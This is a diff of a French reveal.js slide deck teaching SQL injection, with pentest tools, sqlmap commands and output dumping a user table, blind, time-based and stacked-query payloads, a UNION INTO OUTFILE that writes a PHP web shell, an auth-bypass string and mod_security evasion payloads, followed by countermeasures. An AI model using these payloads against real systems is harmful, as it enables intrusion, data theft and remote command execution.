@@ -90,75 +90,273 @@
 					</p>
 				</section>
 
-				<section>
-					<h2>Marvelous Unordered List</h2>
+                <section>
+                    <section>
+					<h2>Les outils de Pen Tests</h2>
 					<ul>
-						<li>No order here</li>
-						<li>Or here</li>
-						<li>Or here</li>
-						<li>Or here</li>
-					</ul>
+						<li>Metasploit</li>
+						<li>SqlNinja</li>
+						<li>Kali linux</li>
+						<li>sqlmap</li>
+                    </ul>
+                    </section>
+                    <section>
+                        <a href="http://www.metasploit.com/">Metasploit</a>
+                        <p>Machine virtuelle pour s'entrainer <a href="https://community.rapid7.com/docs/DOC-1875">
+                            Metasploitable 2</a></p>
+                    </section>
+                    <section>
+                        <a href="http://sqlninja.sourceforge.net/">Sqlninja</a>
+                        <p>Outil pour faire des tests sur Microsoft SQL server.</p>
+                        <p><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0232"> CVE-2010-0232</a>
+                        Permet d'utiliser xp_cmdshell() et de gagner des privilèges sur la machine</p>
+                    </section>
+                    <section>
+                        <a href="http://kali.org/">Kali Linux</a>
+                        <p>Distribution linux pour faire des Pen Tests (BackTrack)</p>
+                    </section>
 				</section>
+
+                <section>
+                    <section>
+                        <h2>Sqlmap</h2>
+                        <pre>
+                            <code class="bash">
+    $ python sqlmap.py -u "http://localhost:8000/?id=1" -a
+                            </code>
+                        </pre>
+                        <p>La pire façon de faire un Pen Test !</p>
+    				</section>
+                    <section>
+                        <h2>Sqlmap fingerprinting</h2>
+                        <pre>
+                            <code class="bash">
+    $ python sqlmap.py -u "http://localhost:8000/?id=1" --banner
+    [..]
+    ---
+    [19:51:35] [INFO] the back-end DBMS is MySQL
+    [19:51:35] [INFO] fetching banner
+    web application technology: PHP 5.4.16
+    back-end DBMS: MySQL 5.0
+    banner:    '5.5.31-MariaDB'
+                            </code>
+                        </pre>
+                        </section>
+                   <section>
+                        <h2>Sqlmap enumeration</h2>
+                        <pre>
+                            <code class="bash">
+    $ python sqlmap.py -u "http://localhost:8000/?id=1" --tables -Dweb5 -Tuser --dump
+    [..]
+    [20:27:40] [INFO] fetching columns for table 'user' in database 'web5'
+    [20:27:41] [WARNING] reflective value(s) found and filtering out
+    [20:27:41] [INFO] fetching entries for table 'user' in database 'web5'
+    [20:27:41] [INFO] analyzing table dump for possible password hashes
+    [20:27:41] [INFO] recognized possible password hashes in column 'password'
+    [20:27:41] [INFO] writing hashes to file '/tmp/sqlmaphashes-g5Rh7R.txt' for eventual further processing with other tools
+
+    [20:27:47] [INFO] using hash method 'md5_generic_passwd'
+    what dictionary do you want to use?
+    [1] default dictionary file '/sqlmap-dev/txt/wordlist.zip' (press Enter)
+    [2] custom dictionary file
+    [3] file with list of dictionary files
+    > 1
+    [20:27:55] [INFO] using default dictionary
+    do you want to use common password suffixes? (slow!) [y/N] 
+    [20:27:58] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+    [20:27:58] [INFO] starting 4 processes 
+    [20:28:16] [WARNING] no clear password(s) found                                                                                      
+    [20:28:16] [INFO] postprocessing table dump
+    Database: web5
+    Table: user
+    [1 entry]
+    +----+-------+----------------------------------+
+    | id | login | password                         |
+    +----+-------+----------------------------------+
+    | 1  | admin | 134562665af1fa4f74ef7c50d4452e8f |
+    +----+-------+----------------------------------+
+
+                            </code>
+                        </pre>
+                    </section>
+                </section>
+                <section>
+                    <h2>Les autres techniques d'injection</h2>
+               </section>
+               <section>
+                    <h2>Blind Sql Injection</h2>
+                    <p>On teste les injections sur des réponses TRUE et FALSE</p>
+                    <p>Pas de messages d'erreurs SQL</p>
+                    <p>Technique de devinette</p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article WHERE id = 1 and 
+    (
+        select if(substring(login,1,1) = 'a', 1, null) 
+        from user where id = 1
+    );#
+                        </code>
+                    </pre>
+				</section>
+               <section>
+                    <h2>Time Based</h2>
+                    <p>Variante de Blind</p>
+                    <p>C'est le temps de réponse qui indique si TRUE ou FALSE</p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article WHERE id = 1 and 
+    (
+        select if(substring(login,1,1) = 'a', SLEEP(5), null) 
+        from user where id = 1
+    );#
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <h2>Stacked Queries</h2>
+                    <p>Ne fonctionne pas dans tous les cas :
+                    <a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#StackingQueries">
+                        Ferruh Mavituna</a></p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article; DROP user; 
+                        </code>
+                    </pre>
+				</section>
+                <section>
+                    <h2>Dump dans un fichier</h2>
+                    <p>Dump d'une base ou table</p>
+                    <p>Injection d'un fichier</p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article 
+        union select "&lt?php", "echo system($_GET['cmd']);", "?&gt" 
+        into outfile "/var/www/cmd.php"
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <h2>Erreur de design de code</h2>
+                    <p>On peut outre passer un authentification</p>
+                    <pre>
+                        <code class="php">
+    $query = "SELECT * FROM user WHERE login = ".$_POST['login']." 
+        AND password = ".$_POST['password'];
+                        </code>
+                     </pre>
+                    <pre>
+                       <code class="sql">
+        //payload
+        login: admin,
+        password: " or 1=1;
+                        </code>
+                      </pre>
+                    <pre>
+                      <code class="sql">
+    SELECT * FROM user WHERE login = "admin" AND password = "" OR 1=1;
+                        </code>
+                    </pre>
+				</section>
+                <section>
+                    <h2>Contre mesures</h2>
+                </section>
+                <section>
+                    <h2>Prepare Statement</h2>
+                    <pre>
+                        <code class="php">
+    $stm = $pdo->prepare("select * from article where id = :id");
+    $stm->bindParam(":id", $_GET["id"])
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <h2>Stored Procedure</h2>
+                    <pre>
+                        <code class="sql">
+    mysql> CREATE PROCEDURE simpleproc (IN article_id INT)
+        -> BEGIN
+        ->   SELECT * FROM ARTICLE WHERE id = article_id ;
+        -> END
+                        </code>
+                    </pre>
+                    <pre>
+                        <code class="php">
+    $stm = $pdo->prepare("call simpleproc(?)");
+    $stm->bindParam(1, $_GET["id"])
+                        </code>
+                    </pre>
+                </section>
 
 				<section>
-					<h2>Fantastic Ordered List</h2>
-					<ol>
-						<li>One is smaller than...</li>
-						<li>Two is smaller than...</li>
-						<li>Three!</li>
-					</ol>
+					<h2>Data Validation / Input Sanitazation</h2>
+					<ul>
+                        <li>A utiliser si les autres solutions sont impossibles</li>
+                        <li>Important au niveau UX</li>
+                        <li>Efficace pour les XSS</li>
+					</ul>
+                </section>
+                <section>
+                    <h2>Data Validation / Input Sanitazation</h2>
+                    <p>C'est du code donc potentiellement vulnérable</p>
+                    <pre>
+                        <code class="php">
+    // Facile sur les nombres
+    $id = (int) $_GET['id']
+
+    // Complexe sur les chaines de caractères
+    $str = (string) $_GET['str'] ;-)
+                        </code>
+                    </pre>
 				</section>
+                <section>
+                    <h2>Problématique de whitelist / blacklist</h2>
+                    <pre>
+                        <code class="php">
+    //Enlève les espaces
+    $str = 'union select';
+    echo preg_replace('/\s+/', '',$str);
 
-				<section data-markdown>
-					<script type="text/template">
-						## Markdown support
+    > unionselect
+                        </code>
+                    </pre>
+                    <pre>
+                        <code class="sql">
+    payload = 1/**/and/**/union/**/select/**/database()
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <section>
+                        <h2>IDS : Intrusion Detection System</h2>
+                        <h6>( ou WAF : Web Application Firewall )</p>
+                            <p><a href="https://www.modsecurity.org/">Modsecurity</a> des vulnérabilités connues et 
+                                corrigées. Mis à jour ?</p>
+                        </pre>
+                        <pre>
+                            <code class="sql">
+    // supprime des mots clés.
+    payload = 1 unUNIONion selSELECTect database()
+    mod_security : 1 union select database()
 
-						For those of you who like that sort of thing. Instructions and a bit more info available [here](https://github.com/hakimel/reveal.js#markdown).
-
-						```
-						<section data-markdown>
-						  ## Markdown support
-
-						  For those of you who like that sort of thing.
-						  Instructions and a bit more info available [here](https://github.com/hakimel/reveal.js#markdown).
-						</section>
-						```
-					</script>
-				</section>
-
-				<section id="transitions">
-					<h2>Transition Styles</h2>
-					<p>
-						You can select from different transitions, like: <br>
-						<a href="?transition=cube#/transitions">Cube</a> -
-						<a href="?transition=page#/transitions">Page</a> -
-						<a href="?transition=concave#/transitions">Concave</a> -
-						<a href="?transition=zoom#/transitions">Zoom</a> -
-						<a href="?transition=linear#/transitions">Linear</a> -
-						<a href="?transition=fade#/transitions">Fade</a> -
-						<a href="?transition=none#/transitions">None</a> -
-						<a href="?#/transitions">Default</a>
-					</p>
-				</section>
-
-				<section id="themes">
-					<h2>Themes</h2>
-					<p>
-						Reveal.js comes with a few themes built in: <br>
-						<a href="?theme=sky#/themes">Sky</a> -
-						<a href="?theme=beige#/themes">Beige</a> -
-						<a href="?theme=simple#/themes">Simple</a> -
-						<a href="?theme=serif#/themes">Serif</a> -
-						<a href="?theme=night#/themes">Night</a> -
-						<a href="?#/themes">Default</a>
-					</p>
-					<p>
-						<small>
-							* Theme demos are loaded after the presentation which leads to flicker. In production you should load your theme in the <code>&lt;head&gt;</code> using a <code>&lt;link&gt;</code>.
-						</small>
-					</p>
-				</section>
-
+    // On lui fait plus.
+    payload : 1/*&foo=1*/union/*&bar=2*/select/*&plop=3*/database()
+    mod_security : id= 1, foo=1 union, bar=2 select, plop=3 database()
+    apps : 1 union select database()
+                            </code>
+                        </pre>
+                    </section>
+                    <section>
+                        <h2>Unit Tests</h2>
+                        <ul>
+                            <li class="fragment">Essentiel sur une app from scratch</li>
+                            <li class="fragment">Régression de sécurité</li>
+                            <li class="fragment">Pen Tests dans le système d'intégration continue </li>
+                        </ul>
+                            <a href="http://1337day.com/exploit/18109">Exemple de bypass</a> 
+                            de <a href="https://www.modsecurity.org/">Modsecurity</a> version 2.6.5
+                        </p>
+                    </section>
+                </section>
 				<section>
 					<section data-state="alert">
 						<h2>Global State</h2>
